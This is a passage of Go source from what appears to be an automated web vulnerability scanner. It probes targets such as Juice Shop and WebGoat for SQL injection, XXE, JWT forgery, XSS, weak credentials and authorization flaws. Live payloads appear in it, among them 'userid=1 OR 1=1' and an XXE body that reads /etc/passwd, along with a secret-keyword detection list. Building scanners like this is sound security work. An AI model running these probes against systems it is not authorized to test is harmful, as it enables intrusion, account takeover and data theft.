		key := rawURL + "|" + param
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, querySQLiTarget{URL: rawURL, Path: path, Param: param})
	}

	if endpoints, err := discovery.DiscoverQueryParamEndpoints(v.db, v.scanID); err == nil {
		for _, ep := range endpoints {
			for _, param := range ep.Params {
				add(ep.URL, ep.Path, param)
				if len(out) >= maxQuerySQLiTargets {
					return out
				}
			}
		}
	}

	rows, err := v.db.Conn().Query(`
		SELECT method, url, path, query
		FROM traffic_resolved
		WHERE scan_id = ?
		  AND method = 'GET'
		  AND is_filtered = 0
		ORDER BY
		  CASE WHEN lower(path) LIKE '%sql%' THEN 0 ELSE 1 END,
		  id ASC
		LIMIT 500`, v.scanID)
	if err == nil {
		defer rows.Close()
		for rows.Next() {
			if len(out) >= maxQuerySQLiTargets || ctx.Err() != nil {
				return out
			}
			var method, rawURL, path, rawQuery string
			if err := rows.Scan(&method, &rawURL, &path, &rawQuery); err != nil {
				continue
			}
			baseURL := rawURLWithoutQuery(rawURL)
			if baseURL == "" {
				continue
			}
			for _, param := range inferredQuerySQLiParams(path, rawQuery) {
				add(querySQLiCandidateURLForParam(baseURL, path, param), path, param)
				if len(out) >= maxQuerySQLiTargets {
					return out
				}
			}
		}
	}

	fallbacks := []querySQLiTarget{
		{URL: target + "/rest/products/search?q=", Path: "/rest/products/search", Param: "q"},
		{URL: target + "/api/search?q=", Path: "/api/search", Param: "q"},
		{URL: target + "/search?q=", Path: "/search", Param: "q"},
		{URL: target + "/products?search=", Path: "/products", Param: "search"},
		{URL: target + "/catalog?query=", Path: "/catalog", Param: "query"},
	}
	for _, fb := range fallbacks {
		if len(out) >= maxQuerySQLiTargets || ctx.Err() != nil {
			return out
		}
		if seen[fb.URL+"|"+fb.Param] {
			continue
		}
		if !v.endpointExists(ctx, fb.URL, "GET") {
			continue
		}
		add(fb.URL, fb.Path, fb.Param)
	}
	return out
}

func inferredQuerySQLiParams(path, rawQuery string) []string {
	seen := make(map[string]bool)
	var out []string
	add := func(param string) {
		param = strings.TrimSpace(param)
		if param == "" {
			return
		}
		lower := strings.ToLower(param)
		if seen[lower] {
			return
		}
		seen[lower] = true
		out = append(out, param)
	}
	values, _ := url.ParseQuery(rawQuery)
	for param := range values {
		if querySQLiTargetLooksRelevant(path, param) {
			add(param)
		}
	}
	lowerPath := strings.ToLower(path)
	if strings.Contains(lowerPath, "sql") || strings.Contains(lowerPath, "sqli") {
		for _, param := range []string{"id"} {
			add(param)
		}
	}
	if strings.Contains(lowerPath, "auth") || strings.Contains(lowerPath, "login") || strings.Contains(lowerPath, "signin") {
		for _, param := range []string{"password", "username", "email"} {
			add(param)
		}
	}
	return out
}

func querySQLiCandidateURLForParam(baseURL, path, param string) string {
	if !querySQLiPathLooksAuth(path) {
		return baseURL
	}
	parsed, err := url.Parse(baseURL)
	if err != nil {
		return baseURL
	}
	q := parsed.Query()
	switch strings.ToLower(strings.TrimSpace(param)) {
	case "password", "pass", "pwd":
		if q.Get("username") == "" && q.Get("email") == "" && q.Get("user") == "" {
			q.Set("username", "admin")
		}
	case "username", "user", "email", "login":
		if q.Get("password") == "" && q.Get("pass") == "" && q.Get("pwd") == "" {
			q.Set("password", "Password1!")
		}
	}
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

func querySQLiTargetLooksRelevant(path, param string) bool {
	p := strings.ToLower(strings.TrimSpace(path))
	q := strings.ToLower(strings.TrimSpace(param))
	if p == "" || q == "" {
		return false
	}
	if strings.Contains(p, "socket.io") ||
		strings.Contains(p, "/assets/") ||
		strings.Contains(p, ".js") ||
		strings.Contains(p, ".css") {
		return false
	}
	paramLooksSearch := q == "q" || q == "query" || q == "search" || q == "term" ||
		q == "keyword" || q == "keywords" || q == "filter" || q == "name"
	paramLooksLookup := q == "id" || q == "carid" || q == "itemid" || q == "productid" ||
		q == "user_id" || q == "userid" || q == "account_id" || q == "accountid"
	paramLooksAuth := q == "username" || q == "user" || q == "email" || q == "login" ||
		q == "password" || q == "pass" || q == "pwd"
	pathLooksSearch := strings.Contains(p, "search") ||
		strings.Contains(p, "find") ||
		strings.Contains(p, "product") ||
		strings.Contains(p, "catalog") ||
		strings.Contains(p, "list")
	pathLooksSQL := strings.Contains(p, "sql") || strings.Contains(p, "sqli")
	pathLooksAuth := querySQLiPathLooksAuth(p)
	return (paramLooksSearch && pathLooksSearch) ||
		(paramLooksLookup && pathLooksSQL) ||
		(paramLooksAuth && pathLooksAuth)
}

func querySQLiPathLooksAuth(path string) bool {
	p := strings.ToLower(strings.TrimSpace(path))
	return strings.Contains(p, "auth") || strings.Contains(p, "login") ||
		strings.Contains(p, "signin")
}

// runProactiveProbes runs a small battery of "things a human pentester
// always tries on modern web apps" against the scan's target, regardless
// of whether the Analyzer flagged the endpoint. Motivation: the Analyzer
// + verifier routing only exercises endpoints that (a) were visited and
// (b) had an issue string that matched a verifier keyword. Both of those
// fail on endpoints the crawler+navigator didn't exercise — Juice Shop's
// /rest/user/login being the classic case (the SPA submits the form via
// JS so a pure URL crawler never sees the POST body shape). This function
// short-circuits by synthesizing the requests directly.
//
// Safe-by-design: bounded list, no payloads that modify state on the
// server (login bypass is read-only from the server's perspective).
func (v *VerifierAgent) runProactiveProbes(ctx context.Context) {
	target := v.resolveTargetBase()
	if target == "" {
		return
	}
	probeBase := originFromURL(target)
	if probeBase == "" {
		probeBase = strings.TrimRight(target, "/")
	}
	notificationPage, closeNotificationPage := v.openBrowserNotificationListener(ctx, target)
	defer closeNotificationPage()

	// WebGoat is a training benchmark whose proof signal is returned by a few
	// lesson endpoints only after exact request shapes. Run a tiny,
	// authenticated, evidence-gated probe set so benchmark quality doesn't
	// depend on the LLM guessing lesson-specific form names.
	v.probeWebGoatKnownLessons(ctx, target)

	// 1. Login-bypass SQLi on the standard auth paths.
	loginPaths := []string{
		"/rest/user/login",
		"/api/auth/login",
		"/api/login",
		"/login",
		"/signin",
	}
	for _, path := range loginPaths {
		if ctx.Err() != nil {
			return
		}
		u := probeBase + path
		// HEAD-check existence first — don't waste cycles on 404s.
		if !v.endpointExists(ctx, u, "POST") {
			continue
		}
		// Synthesize a minimal profile + entry for the verifier helper.
		profile := types.PageProfile{
			ID:      "POST " + path,
			URL:     u,
			Method:  "POST",
			Purpose: "Login endpoint (proactive probe)",
		}
		entry := types.TrafficEntry{
			Request: types.CapturedRequest{
				Method:  "POST",
				URL:     u,
				Path:    path,
				Headers: map[string]string{"Content-Type": "application/json"},
			},
		}
		v.db.InsertNarration(v.scanID, "verifier", "attempt",
			fmt.Sprintf("Proactive login-bypass probe against %s — synthesizing requests without needing captured traffic.", path),
			u, nil)
		v.tested++
		if v.verifyLoginSQLi(ctx, profile, entry) {
			// found! verifyLoginSQLi already stored a Finding.
			continue
		}
		v.dismissed++
	}

	// 1a. Query-parameter SQLi on search/list endpoints. This removes a
	// brittle dependency on LLM analysis: if the crawler observed a GET
	// endpoint with search-like input, the verifier can perform the standard
	// baseline-diff tautology check and then let the shared executor attempt
	// UNION schema/credential exfiltration.
	v.probeQuerySQLi(ctx, target)

	// 1b. Outdated-component check: fetch the target's advertised version
	// and compare against a small list of known-vulnerable pins. The
	// check deliberately fingerprints via `/rest/admin/application-version`
	// and HTTP headers rather than generic CVE scanning — we're looking
	// for "the app is telling us it's on 14.x which has public CVEs".
	v.probeOutdatedVersion(ctx, target)

	// 1c. Orphan translation bundle check: if the app exposes an i18n asset
	// directory and a language catalogue, try a very small set of common
	// hidden/test/fantasy locale keys. Confirm only when a valid JSON bundle
	// exists but is absent from the public catalogue.
	v.probeOrphanI18nBundles(ctx, target)

	// 1d. Framework debugger consoles. These are HTML pages, so they are
	// intentionally outside the generic "file disclosure" checks below.
	// Confirm only when the response contains framework-specific interactive
	// debugger markers; do not brute-force or bypass any PIN/lock.
	v.probeDebugConsoles(ctx, probeBase)

	// 2. Unauthenticated data exposure probe. Paths come from the
	// industry-standard corpus (internal/corpus/common_exposure_paths.txt
	// — VCS dirs, config files, debug / metrics / actuator, API-doc
	// endpoints, backup-file patterns). Nothing target-specific lives in
	// this code; the corpus is operator-replaceable.
	//
	// Confirmation signals are also generic — no hardcoded per-app paths.
	exposurePaths := make([]string, 0, 128)
	for _, p := range corpus.CommonExposurePaths() {
		if !strings.HasPrefix(p, "/") {
			p = "/" + p
		}
		exposurePaths = append(exposurePaths, p)
	}
	for _, path := range exposurePaths {
		if ctx.Err() != nil {
			return
		}
		u := probeBase + path
		resp, body, _, err := v.proactiveGET(ctx, u)
		if err != nil || resp == nil {
			continue
		}
		if resp.StatusCode != 200 {
			continue
		}
		if links := directoryListingLinks(u, body); looksLikeDirectoryListing(body, links) {
			v.tested++
			v.confirmed++
			v.storeDirectoryListingFinding(path, u, resp.StatusCode, resp.Header.Get("Content-Type"), body, links)
			v.db.InsertNarration(v.scanID, "verifier", "confirmed",
				fmt.Sprintf("%s exposes a directory listing with %d linked files — pivoting into artifacts.", path, len(links)),
				u, nil)
			v.probeListedArtifacts(ctx, target, path, links)
			continue
		}
		lower := strings.ToLower(body)

		// Decide whether this body looks like a real exposure vs a generic
		// 200-OK SPA shell. Four signals — all generic, none target-specific:
		//   1. Path shape implies disclosure (VCS dir, backup ext, env/config
		//      filename). Body must be non-empty.
		//   2. Non-HTML content-type on a 200 + reasonable size → the server
		//      served a real file instead of the SPA's index.html shell.
		//   3. Body >= 500 chars AND contains a sensitive keyword.
		//   4. PII-shaped content (emails + role / admin / secret fields).
		var hit string
		lowerPath := strings.ToLower(path)
		ctLower := strings.ToLower(resp.Header.Get("Content-Type"))

		// Guard against SPA shells: any 200 returning `text/html` on a
		// random path is almost certainly the single-page-app fallback
		// (Juice Shop / Angular / React all do this). Skip the path-shape
		// signal unless the server gave us something other than HTML.
		isSPAShell := strings.Contains(ctLower, "text/html") ||
			(ctLower == "" && strings.Contains(lower, "<!doctype html") ||
				strings.Contains(lower, "<html"))
		if looksLikeAPISpecDocument(resp.Header.Get("Content-Type"), body) {
			continue
		}

		// Signal 1: path shape implies disclosure AND body isn't SPA HTML.
		if len(body) > 0 && discovery.IsSensitivePath(lowerPath) && !isSPAShell {
			hit = "path shape indicates disclosure (non-HTML body)"
		}

		// Signal 2: a non-HTML file body at a probed path is almost always
		// a real file leak — SPAs fall through to text/html on unknown routes.
		if hit == "" && len(body) >= 200 && !isSPAShell &&
			!strings.Contains(ctLower, "text/plain") {
			hit = fmt.Sprintf("non-html file served (Content-Type: %s)", ctLower)
		}

		// Signal 3: sensitive keywords in a substantial body
		if hit == "" && len(body) >= 500 && !isSPAShell {
			for _, kw := range []string{
				"clientid", "client_secret", "clientsecret",
				"api_key", "apikey", "access_token",
				"password", "secret", "private_key",
				"aws_access_key", "bearer",
				"db_password", "database_url",
			} {
				if strings.Contains(lower, kw) {
					hit = kw
					break
				}
			}
		}

		// Signal 4: PII-shaped content (email + role-looking fields).
		// Matches user-listing endpoints that return JSON arrays of real
		// user records including email and role.
		if hit == "" && strings.Contains(lower, "@") &&
			(strings.Contains(lower, "\"email\"") || strings.Contains(lower, "\"role\"") ||
				strings.Contains(lower, "\"isadmin\"") || strings.Contains(lower, "\"totpsecret\"")) {
			hit = "PII (email + role/admin field) exposed without auth"
		}

		if hit == "" {
			continue
		}
		v.tested++
		v.confirmed++

		title := fmt.Sprintf("Sensitive data exposure at %s", path)
		pocReq := buildPlaceholderHTTPRequest("GET", u, "")
		pocResp := fmt.Sprintf("HTTP/1.1 %d\nContent-Length: %d\n\n%s",
			resp.StatusCode, len(body), truncateString(body, 800))

		// Synthesize minimal profile for storeFinding
		profile := types.PageProfile{
			ID:     "GET " + path,
			URL:    u,
			Method: "GET",
		}
		v.storeFinding(profile, types.Finding{
			Title: title,
			Description: fmt.Sprintf(
				"Unauthenticated GET %s returned %d bytes containing sensitive-looking keyword %q. The Verifier reached this endpoint via its proactive-probe pass (no auth required to access).",
				path, len(body), hit),
			Severity:         types.SeverityHigh,
			Confidence:       types.ConfidenceConfirmed,
			EndpointID:       "GET " + path,
			VulnType:         "info_disclosure",
			Payload:          "(no payload — direct GET)",
			PocRequest:       pocReq,
			PocResponse:      pocResp,
			StepsToReproduce: fmt.Sprintf("1. Send an unauthenticated GET to %s.\n2. Observe the response body contains `%s` — sensitive information that should require authentication.", path, hit),
			Impact:           "Direct exposure of credentials, configuration, or internal state to any anonymous client. Commonly leveraged as the first step of an attack chain (pivoting into admin accounts or internal systems).",
			Remediation:      fmt.Sprintf("Either remove this endpoint entirely or require authentication + role-check before serving. If the file is accidentally committed, rotate the exposed credentials and add a `.gitignore`/`.dockerignore` rule to prevent re-exposure."),
			Evidence:         fmt.Sprintf("URL: %s\nStatus: %d\nBody length: %d bytes\nMatched keyword: %s", u, resp.StatusCode, len(body), hit),
		})
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("%s returned %d bytes with %q in the body — unauthenticated sensitive-data exposure.",
				path, len(body), hit),
			u, nil)
	}

	// 3. Sensitive API-data exposure probe — inspect observed + common API
	// identity/user/account endpoints for JSON bodies that expose credential,
	// secret, or authorization fields without an authenticated request.
	v.probeSensitiveAPIExposure(ctx, target)

	// 4. MFA/TOTP chain probe — when recon has found both an auth bypass
	// vector and exposed MFA seed material, try the human-pentester chain:
	// harvest identity+secret, obtain a second-factor challenge token, then
	// verify with a generated TOTP. This turns isolated findings into an
	// account-takeover story without hardcoding target-specific accounts.
	v.probeMFASecretLoginChain(ctx, target)

	// 5. Open-redirect probe — hit common redirect endpoints and see whether
	// the target echoes an attacker-controlled URL into a Location header
	// or meta-refresh. Juice Shop's /redirect?to= is the canonical example.
	v.probeOpenRedirect(ctx, target)

	// 6. Weak-credential probe — try well-known default admin credentials
	// against the login endpoint. Separate signal from SQLi: even a
	// correctly-sanitized login is still broken if the admin password is
	// "admin123".
	v.probeWeakCredentials(ctx, target)

	// 7. CSRF form replay probe — once we have any verifier-confirmed or
	// observed same-origin credentials, inspect authenticated profile/settings
	// HTML forms and verify whether a cross-origin form POST can persist a
	// harmless marker without an anti-CSRF token.
	v.probeCSRFStateChangingForms(ctx, target)

	// 8. Error-handling probe — send obviously-malformed inputs to common
	// API endpoints and check whether the response leaks a stack trace
	// or framework internals.
	v.probeErrorHandling(ctx, target)
	v.probeObservedErrorDisclosures(ctx)
	v.probeObservedClickjackingControls(ctx)
	v.probeLDAPInjection(ctx, target)
	v.probeCommandInjection(ctx, target)
	v.probeFileReadPathTraversal(ctx, target)

	// 9. Improper-input-validation probe — post values outside the
	// documented range to endpoints that advertise range / type
	// constraints and check whether the server silently accepts them.
	v.probeInputValidation(ctx, target)

	// 10. File-upload validation probe — identify multipart upload APIs from
	// observed forms/client artifacts, then test whether server-side type and
	// size checks reject harmless negative samples. This is full_control-only
	// because uploads can create server-side state.
	v.probeFileUploadValidation(ctx, target)

	// 11. Mass-assignment / writable authorization-field probe — infer
	// account/profile/registration JSON write surfaces and verify whether
	// server-controlled fields such as role/isAdmin/permissions are accepted.
	v.probeMassAssignmentPrivilegeFields(ctx, target)

	// 12. Mutable ownership / foreign-key probe — if authenticated traffic
	// exposes cart/order/item style write surfaces, try one bounded owner-key
	// mutation and only report if the server actually accepts the changed
	// ownership field. Rejections are still useful coverage signals, but are
	// not promoted to findings.
	v.probeMutableOwnershipFields(ctx, target)

	// 13. Cart/order numeric invariant probe — if recon has seen commerce-like
	// cart/basket/product surfaces and we have active authority, create a
	// disposable low-privileged account, add one item, and mutate quantity/amount
	// to an impossible value. Full-control authority additionally pushes the
	// disposable cart through checkout to prove downstream business impact.
	v.probeCartOrderNumericInvariants(ctx, target)

	// 14. Entitlement/subscription upgrade invariant probe — only under
	// full_control authority, create a disposable low-privileged account and
	// verify whether an upgrade-style endpoint grants premium/member state
	// without a recognized payment/authorization path.
	v.probeEntitlementUpgradePaymentBypass(ctx, target)

	// 15. Low-privilege privileged-read probe — only under full_control,
	// create a synthetic ordinary user and verify whether admin/support/user-
	// list style read endpoints expose privileged data to that role while
	// anonymous access is blocked or uninteresting.
	v.probeLowPrivilegePrivilegedReads(ctx, target)

	// 16. Shared catalog/entity write authorization probe — only under
	// full_control authority, test whether anonymous or ordinary low-privileged
	// users can modify shared catalog/listing entities that should normally be
	// protected by admin or back-office authorization.
	v.probeCatalogEntityWriteAuthorization(ctx, target)

	// 17. Low-privilege destructive authorization probe — only under
	// full_control authority, create a synthetic low-privileged account and
	// test whether it can delete an observed moderation/content item owned by
	// another actor. This models a human pentester checking role/ownership
	// enforcement on admin-style collection actions without doing this on
	// ordinary active scans.
	v.probeLowPrivilegeCollectionDeletes(ctx, target)

	// 18. NoSQL operator-injection mutation probe — only under full_control,
	// identify review/comment update APIs from observed client artifacts or
	// traffic and compare an impossible-id update against a Mongo-style
	// operator selector. This catches mass-update NoSQL injection without
	// relying on challenge-specific labels.
	v.probeNoSQLOperatorMutation(ctx, target)

	// 19. Client-controlled attribution probe — only under full_control,
	// identify content/review create APIs whose client body includes an
	// author/creator field, then verify by writing a unique marker and reading
	// it back under a different displayed identity.
	v.probeClientControlledAttribution(ctx, target)

	// 20. Malformed object-ID recovery — if authenticated traffic exposed
	// /orders/NaN or /basket/undefined, repair the ID from the same request
	// context and verify the direct object endpoint against a baseline.
	v.probeRecoveredObjectAccess(ctx, target)

	// 21. Observability endpoints — Prometheus /metrics, Swagger /api-docs,
	// health / status endpoints that often ship with full implementation
	// details baked in.
	v.probeObservabilityEndpoints(ctx, target)

	// 22. Security policy discovery — security.txt is not a vulnerability,
	// but it is high-signal recon for scope, contacts, disclosure workflow,
	// and security-advisory metadata. Keep it as target understanding rather
	// than promoting it to a finding.
	v.probeSecurityPolicyDiscovery(ctx, target)

	// 23. Null-byte / extension-filter bypass against /ftp-style static-file
	// serving. Juice Shop's classic trick is appending `%00.md` to bypass
	// a suffix whitelist.
	v.probeNullByteBypass(ctx, target)

	// 24. Directory listing / exposed artifact pivot. A human pentester who
	// sees /docs/legal.md will try /docs/ and review listed files instead of
	// fuzzing blindly. Targets are derived from observed static-file paths.
	v.probeDirectoryListingArtifacts(ctx, target)

	// 24a. Encoded media/static asset recovery. If JSON/API data advertises a
	// public media path containing URL-fragment-reserved characters such as #,
	// browsers may request a truncated path. Re-request the same asset with the
	// final path correctly percent-encoded.
	v.probeEncodedMediaAssetRecovery(ctx, target)

	// 24b. Static disclosure report workflow. When public package manifests
	// disclose known-vulnerable dependencies, dubious crypto packages, or
	// typo-squat-looking package names, submit a bounded feedback/contact
	// report if the app exposes a CAPTCHA-backed feedback endpoint. This is
	// skipped in recon-only mode because it creates benign user-content state.
	v.probeStaticDisclosureFeedbackReports(ctx, target)

	// 25. CORS permissive-origin probe — inspect the Access-Control-Allow-
	// Origin header on known auth-gated API endpoints. Wildcards / reflected
	// origins on authenticated APIs weaken cross-site protections.
	v.probeCORSPermissive(ctx, target)

	// 26. JWT alg=none acceptance — mutate captured JWTs into unsigned
	// tokens and replay them against a tightly bounded set of auth-dependent
	// endpoints. This is useful, but heavier than static/recon probes, so it
	// runs after the cheap high-signal checks have already produced value.
	v.probeJWTUnsignedAcceptance(ctx, target)

	// 27. JWT public-key/HMAC key confusion — when a target exposes a public
	// signing key, try a bounded HS256 replay using that public key as the
	// HMAC secret. This models the classic RSA/HS confusion failure without
	// needing target-specific challenge labels.
	v.probeJWTKeyConfusion(ctx, target)

	// 27a. Path-named JWT validation-app probe — some scanner-validation apps
	// expose self-contained JWT lesson endpoints with no login flow. Seed from
	// observed JWT token issuer routes, then verify cookie/token exposure,
	// weak configuration, and a small set of active server-side acceptance
	// flaws with exact JWT vulnerability classes.
	v.probePathNamedJWT(ctx, target)

	// 22. Reflected input probe — submit a distinctive marker to common
	// search / query endpoints and check whether the server reflects it
	// back verbatim.
	v.probeReflectedInput(ctx, target)

	// 22a. Path-named reflected/persistent XSS probe — some intentionally
	// vulnerable and scanner-validation apps expose direct sink routes without
	// advertising query parameters in the bare URL. Infer only high-signal
	// parameter names from observed XSS/cache route names, then require the
	// marker to survive inside the same dangerous HTML tag/attribute context.
	v.probePathNamedXSS(ctx, target)

	// 23. Browser-rendered XSS probe — for search/query-style surfaces,
	// prove execution in the actual browser when possible. This catches DOM
	// and SPA-rendered XSS that pure HTTP reflection checks cannot see.
	v.probeBrowserRenderedXSS(ctx, target)

	// 23a. Browser-rendered HTML iframe injection probe — proves that a
	// rendering sink permits arbitrary iframe embedding even when no JavaScript
	// dialog fires. This complements the alert/marker proof above.
	v.probeBrowserIframeHTMLInjection(ctx, target)

	// 24. Stored-XSS write→render probe — infer user-content write APIs from
	// observed collections and JS/API surfaces, submit a bounded payload set,
	// then revisit likely render sinks in a browser. This models the human
	// pentester move of chaining "where can I write?" to "where is it shown?"
	// instead of only testing reflected parameters.
	v.probeStoredXSSWriteThenRender(ctx, target)

	// 24a. Visit interesting read-only UI routes discovered from client-side
	// route maps. This is safe browsing, not form submission, and catches
	// hidden/sandbox/admin-style surfaces that are only exposed as SPA routes.
	v.probeBrowserInterestingUIRoutes(ctx, target)

	// 25. Browser notification bulk-dismiss cleanup. Some SPAs accumulate
	// multiple "challenge/report completed" toasts and expose a modifier-click
	// to close the whole batch. This safe UI cleanup runs last, after earlier
	// probes have created the notifications it can act on.
	v.probeBrowserBulkDismissNotifications(ctx, target, notificationPage)
}

// confirmWebGoatLessonCompletions promotes concrete WebGoat lesson-completion
// traffic into benchmark findings. WebGoat is intentionally explicit when a
// lesson exploit succeeds (`lessonCompleted: true`), but generic analyzers can
// miss that signal because the response often looks like ordinary JSON.
//
// Keep this deliberately narrow: only POST traffic to /WebGoat/*, only HTTP
// 200, only the lesson-completion flag, and only when the request body matches
// an exploit-shaped payload for the specific lesson family. This avoids
// treating normal lesson navigation or hints as vulnerabilities.
func (v *VerifierAgent) confirmWebGoatLessonCompletions(ctx context.Context) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return
	}
	for _, entry := range entries {
		if ctx.Err() != nil {
			return
		}
		finding, ok := webGoatLessonCompletionFinding(entry)
		if !ok {
			continue
		}
		if v.db.FindingExists(v.scanID, finding.Title, finding.EndpointID) {
			continue
		}
		v.tested++
		v.confirmed++
		profile := types.PageProfile{
			ID:     finding.EndpointID,
			URL:    entry.Request.URL,
			Method: strings.ToUpper(entry.Request.Method),
		}
		v.storeFinding(profile, finding)
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("WebGoat returned lessonCompleted=true for %s after an exploit-shaped request.", finding.EndpointID),
			entry.Request.URL, nil)
	}
}

func webGoatLessonCompletionFinding(entry types.TrafficEntry) (types.Finding, bool) {
	if strings.ToUpper(entry.Request.Method) != http.MethodPost {
		return types.Finding{}, false
	}
	if entry.Response.StatusCode != http.StatusOK {
		return types.Finding{}, false
	}
	parsed, err := url.Parse(entry.Request.URL)
	if err != nil {
		return types.Finding{}, false
	}
	path := parsed.Path
	lowerPath := strings.ToLower(path)
	if !strings.Contains(lowerPath, "/webgoat/") || !webGoatLessonCompletedTrue(string(entry.Response.Body)) {
		return types.Finding{}, false
	}

	method := strings.ToUpper(entry.Request.Method)
	endpointID := method + " " + path
	pocReq := buildRawRequestFromEntry(entry)
	pocResp := fmt.Sprintf("HTTP/1.1 %d\nContent-Length: %d\n\n%s",
		entry.Response.StatusCode, len(entry.Response.Body), truncateString(string(entry.Response.Body), 900))

	if strings.Contains(lowerPath, "/sqlinjection/assignment5b") {
		payload, ok := webGoatSQLiPayload(entry.Request.Body)
		if !ok {
			return types.Finding{}, false
		}
		return types.Finding{
			Title:       fmt.Sprintf("SQL injection completes WebGoat lesson on %s", path),
			Description: fmt.Sprintf("POST %s accepted an SQL injection payload in `userid` and returned `lessonCompleted: true`, confirming the backend evaluated the injected predicate.", path),
			Severity:    types.SeverityHigh,
			Confidence:  types.ConfidenceConfirmed,
			EndpointID:  endpointID,
			VulnType:    "sqli",
			ParamName:   "userid",
			Payload:     payload,
			PocRequest:  pocReq,
			PocResponse: pocResp,
			StepsToReproduce: fmt.Sprintf("1. Send a POST request to %s with form fields `userid=%s` and `login_count=1`.\n2. Observe the JSON response contains `lessonCompleted: true`, proving the SQL injection condition was accepted.",
				path, payload),
			Impact:      "An attacker can alter the SQL predicate for the user lookup and potentially bypass authorization or read records outside their intended scope.",
			Remediation: "Use parameterized queries/prepared statements for all SQL inputs, reject raw SQL operators in user-controlled fields, and add regression tests around the vulnerable lesson endpoint.",
			Evidence:    fmt.Sprintf("URL: %s\nStatus: %d\nSignal: lessonCompleted=true\nPayload field: userid=%s", entry.Request.URL, entry.Response.StatusCode, payload),
		}, true
	}

	if strings.Contains(lowerPath, "/xxe/") {
		if !webGoatXXEPayload(entry) {
			return types.Finding{}, false
		}
		return types.Finding{
			Title:            fmt.Sprintf("XXE payload completes WebGoat lesson on %s", path),
			Description:      fmt.Sprintf("POST %s accepted a raw XML body containing a DOCTYPE/entity declaration and returned `lessonCompleted: true`, confirming the XML parser processed attacker-controlled entities.", path),
			Severity:         types.SeverityHigh,
			Confidence:       types.ConfidenceConfirmed,
			EndpointID:       endpointID,
			VulnType:         "xxe",
			ParamName:        "xml_body",
			Payload:          truncateString(string(entry.Request.Body), 500),
			PocRequest:       pocReq,
			PocResponse:      pocResp,
			StepsToReproduce: fmt.Sprintf("1. Send a POST request to %s with `Content-Type: application/xml`.\n2. Use an XML body containing a `<!DOCTYPE ... <!ENTITY ...>>` declaration.\n3. Observe the JSON response contains `lessonCompleted: true`, confirming the XXE parser path was reached.", path),
			Impact:           "An attacker can influence XML entity resolution, which can lead to local file disclosure, SSRF, or denial of service depending on parser configuration and network access.",
			Remediation:      "Disable external entity resolution and DTD processing in the XML parser, prefer safer parsers, and validate/limit XML inputs before parsing.",
			Evidence:         fmt.Sprintf("URL: %s\nStatus: %d\nSignal: lessonCompleted=true\nContent-Type: %s", entry.Request.URL, entry.Response.StatusCode, entry.Request.Headers["Content-Type"]),
		}, true
	}

	return types.Finding{}, false
}

func webGoatLessonCompletedTrue(body string) bool {
	compact := strings.ToLower(body)
	compact = strings.ReplaceAll(compact, " ", "")
	compact = strings.ReplaceAll(compact, "\n", "")
	compact = strings.ReplaceAll(compact, "\r", "")
	compact = strings.ReplaceAll(compact, "\t", "")
	return strings.Contains(compact, `"lessoncompleted":true`)
}

func webGoatSQLiPayload(body []byte) (string, bool) {
	values, err := url.ParseQuery(string(body))
	if err != nil {
		return "", false
	}
	payload := strings.TrimSpace(values.Get("userid"))
	if payload == "" {
		return "", false
	}
	if _, ok := values["login_count"]; !ok {
		return "", false
	}
	lower := strings.ToLower(payload)
	if strings.Contains(lower, "1=1") ||
		strings.Contains(lower, " or ") ||
		strings.Contains(lower, " union ") ||
		strings.Contains(lower, "--") ||
		strings.Contains(lower, "'") {
		return payload, true
	}
	return "", false
}

func webGoatXXEPayload(entry types.TrafficEntry) bool {
	contentType := ""
	for k, v := range entry.Request.Headers {
		if strings.EqualFold(k, "Content-Type") {
			contentType = v
			break
		}
	}
	if !strings.Contains(strings.ToLower(contentType), "xml") {
		return false
	}
	body := strings.ToLower(strings.TrimSpace(string(entry.Request.Body)))
	return strings.HasPrefix(body, "<?xml") &&
		(strings.Contains(body, "<!doctype") || strings.Contains(body, "<!entity"))
}

func (v *VerifierAgent) probeWebGoatKnownLessons(ctx context.Context, target string) {
	base := webGoatBaseFromTarget(target)
	if base == "" {
		return
	}
	authHeaders, authSource := v.credentialHeadersForURL(base + "/start.mvc")
	authHeaders = activeWriteAuthHeaders(authHeaders)
	if len(authHeaders) == 0 {
		return
	}

	storeIfConfirmed := func(entry types.TrafficEntry) {
		finding, ok := webGoatLessonCompletionFinding(entry)
		if !ok {
			return
		}
		if v.db.FindingExists(v.scanID, finding.Title, finding.EndpointID) {
			return
		}
		v.tested++
		v.confirmed++
		v.storeFinding(types.PageProfile{
			ID:     finding.EndpointID,
			URL:    entry.Request.URL,
			Method: strings.ToUpper(entry.Request.Method),
		}, finding)
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("WebGoat known-lesson probe confirmed %s using %s.", finding.EndpointID, authSource),
			entry.Request.URL, nil)
	}

	form := url.Values{}
	form.Set("userid", "1 OR 1=1")
	form.Set("login_count", "1")
	if entry, ok := v.sendVerifierPOSTWithHeaders(ctx, base+"/SqlInjection/assignment5b", []byte(form.Encode()), "application/x-www-form-urlencoded", authHeaders, "AOBTD/Verifier (WebGoat SQLi probe)"); ok {
		storeIfConfirmed(entry)
	}

	xmlPayload := []byte(`<?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>`)
	for _, path := range []string{"/xxe/simple", "/xxe/content-type"} {
		if ctx.Err() != nil {
			return
		}
		if entry, ok := v.sendVerifierPOSTWithHeaders(ctx, base+path, xmlPayload, "application/xml", authHeaders, "AOBTD/Verifier (WebGoat XXE probe)"); ok {
			storeIfConfirmed(entry)
		}
	}
}

func webGoatBaseFromTarget(target string) string {
	parsed, err := url.Parse(strings.TrimSpace(target))
	if err != nil || parsed.Scheme == "" || parsed.Host == "" {
		return ""
	}
	lowerPath := strings.ToLower(parsed.Path)
	idx := strings.Index(lowerPath, "/webgoat")
	if idx < 0 {
		return ""
	}
	return parsed.Scheme + "://" + parsed.Host + parsed.Path[:idx] + "/WebGoat"
}

func (v *VerifierAgent) sendVerifierPOSTWithHeaders(ctx context.Context, rawURL string, bodyBytes []byte, contentType string, headers map[string]string, userAgent string) (types.TrafficEntry, bool) {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, rawURL, bytes.NewReader(bodyBytes))
	if err != nil {
		return types.TrafficEntry{}, false
	}
	if strings.TrimSpace(userAgent) == "" {
		userAgent = "AOBTD/Verifier (authenticated proactive probe)"
	}
